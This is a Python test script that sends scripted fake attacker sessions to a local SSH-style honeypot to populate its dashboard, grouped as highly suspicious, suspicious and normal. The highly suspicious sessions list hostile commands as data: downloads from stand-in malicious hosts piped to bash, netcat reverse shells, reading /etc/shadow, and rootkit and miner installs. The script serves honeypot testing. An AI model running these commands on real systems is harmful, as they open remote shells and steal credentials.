"""
test_attack.py - Neuro-Trap Test Data Generator
Sends fake attack sessions to honeypot to populate dashboard.
Run: python test_attack.py
"""

import socket
import time

HOST = '127.0.0.1'
PORT = 2222

def send_session(commands, label=""):
    try:
        s = socket.socket()
        s.settimeout(5)
        s.connect((HOST, PORT))
        time.sleep(0.3)
        try: s.recv(1024)  # banner
        except: pass
        for cmd in commands:
            s.send((cmd + '\n').encode())
            time.sleep(0.2)
        s.close()
        print(f"  [OK] {label}")
    except Exception as e:
        print(f"  [ERR] {label}: {e}")

print("=" * 50)
print("Neuro-Trap Test Data Generator")
print("=" * 50)

# ── HIGHLY SUSPICIOUS sessions ──────────────────────
print("\n[1] Sending HIGHLY_SUSPICIOUS sessions...")

send_session([
    "whoami", "id",
    "wget http://185.220.101.5/malware.sh",
    "chmod +x malware.sh",
    "nc -e /bin/bash 192.168.1.100 4444",
    "/bin/bash -i",
    "cat /etc/shadow",
], "Reverse shell + malware download")
time.sleep(0.5)

send_session([
    "uname -a", "whoami",
    "curl http://evil.ru/backdoor.sh | /bin/bash",
    "python -c 'import socket,subprocess,os'",
    "base64 -d <<< 'aGVsbG8='",
    "perl -e 'system(\"/bin/sh\")'",
], "Python/Perl exploit")
time.sleep(0.5)

send_session([
    "ls -la /root",
    "cat /etc/passwd",
    "cat /etc/shadow",
    "wget http://103.56.144.22/shell.sh",
    "chmod +x shell.sh",
    "ncat 10.0.0.5 9999 -e /bin/sh",
    "echo | bash",
], "Shadow file + ncat shell")
time.sleep(0.5)

send_session([
    "whoami", "id", "uname -a",
    "wget http://malware.top/dropper.exe",
    "curl -o /tmp/x http://185.220.101.5/x",
    "chmod +x /tmp/x",
    "/tmp/x &",
    "nc -e /bin/sh 10.10.10.10 4444",
], "Dropper + netcat")
time.sleep(0.5)

send_session([
    "ps aux", "netstat -an",
    "python -c \"import os; os.system('/bin/bash')\"",
    "ruby -e \"exec '/bin/sh'\"",
    "wget http://bad.xyz/miner.sh",
    "cat /etc/shadow",
    "base64 -d > /tmp/payload",
], "Crypto miner + shadow")
time.sleep(0.5)

send_session([
    "id", "whoami",
    "curl http://185.220.101.5/malware.shchmod",
    "chmod +x malware.sh",
    "/bin/bash malware.sh",
    "nc -e /bin/bash 192.168.100.1 1337",
], "HIGHLY suspicious session 6")
time.sleep(0.5)

send_session([
    "uname -r", "cat /proc/version",
    "wget http://trojan.cc/rootkit.tar.gz",
    "tar -xzf rootkit.tar.gz",
    "cd rootkit && ./install.sh",
    "cat /etc/shadow",
    "perl -e 'print \"exploit\"'",
], "Rootkit install attempt")
time.sleep(0.5)

send_session([
    "whoami", "hostname",
    "wget http://185.220.101.5/bot.py",
    "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
    "base64 -d payload | bash",
    "nc -e /bin/bash 172.16.0.1 5555",
], "Bot + pty shell")
time.sleep(0.5)

# ── SUSPICIOUS sessions ───────────────────────────
print("\n[2] Sending SUSPICIOUS sessions...")

send_session([
    "whoami", "id",
    "cat /etc/passwd",
    "uname -a",
    "ls -la",
    "ps aux",
], "Recon scan 1")
time.sleep(0.5)

send_session([
    "whoami",
    "netstat -an",
    "ifconfig",
    "cat /etc/passwd",
    "ls -la /home",
], "Recon scan 2")
time.sleep(0.5)

send_session([
    "uname -a",
    "ps aux",
    "cat /etc/passwd",
    "ls -la /root",
    "id",
], "System enumeration")
time.sleep(0.5)

send_session([
    "whoami",
    "cat /etc/passwd",
    "ifconfig",
    "netstat",
    "ls -la",
], "Network recon")
time.sleep(0.5)

send_session([
    "id", "whoami",
    "cat /etc/passwd",
    "uname -a",
    "ls -la /etc",
], "Suspicious recon 5")
time.sleep(0.5)

# ── NORMAL sessions (banner grab / benign) ────────
print("\n[3] Sending NORMAL sessions...")

send_session(["help"], "Help command only")
time.sleep(0.5)

send_session(["ls"], "Simple ls")
time.sleep(0.5)

send_session(["pwd"], "pwd only")
time.sleep(0.5)

send_session(["ls", "pwd", "help"], "Basic commands")
time.sleep(0.5)

send_session(["uname"], "uname only")
time.sleep(0.5)

send_session(["ls", "pwd"], "Normal browse")
time.sleep(0.5)

send_session(["help", "ls"], "Help + ls")
time.sleep(0.5)

print("\n" + "=" * 50)
print("Done! Total sessions sent:")
print("  HIGHLY_SUSPICIOUS : 8")
print("  SUSPICIOUS        : 5")
print("  NORMAL            : 7")
print("  TOTAL             : 20")
print("=" * 50)
